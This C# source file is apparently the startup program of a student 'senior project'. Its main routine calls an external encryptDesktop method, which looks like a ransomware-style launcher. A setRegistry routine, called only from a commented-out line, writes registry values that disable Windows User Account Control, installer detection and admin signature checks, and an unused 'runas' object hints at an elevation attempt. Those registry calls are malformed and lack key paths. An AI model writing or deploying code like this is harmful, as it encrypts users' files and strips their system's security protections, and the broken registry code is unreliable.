using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using EncryptionLogic;
using System.Windows;
using SeniorProject;
using System.Diagnostics;

namespace ConsoleApplication1
{
	class SeniorProjectStartup
	{
		[STAThread]
		static void Main(string[] args)
		{
			ProcessStartInfo something = new ProcessStartInfo();
			something.Verb = "runas";
			//setRegistry();
			startEncryption();
			//MainWindow window = new MainWindow();
			//window.Show();
			Console.ReadLine();
		}

		private static void setRegistry()
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableUIADesktopToggle", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "ConsentPromptBehaviorAdmin", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableInstallerDetection", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "ValidateAdminCodeSignatures", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableSecureUIAPaths", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableLUA", 0);
		}

		private static void startEncryption()
		{
			Encryption encryption = new Encryption();
			encryption.encryptDesktop();
		}
	}
}
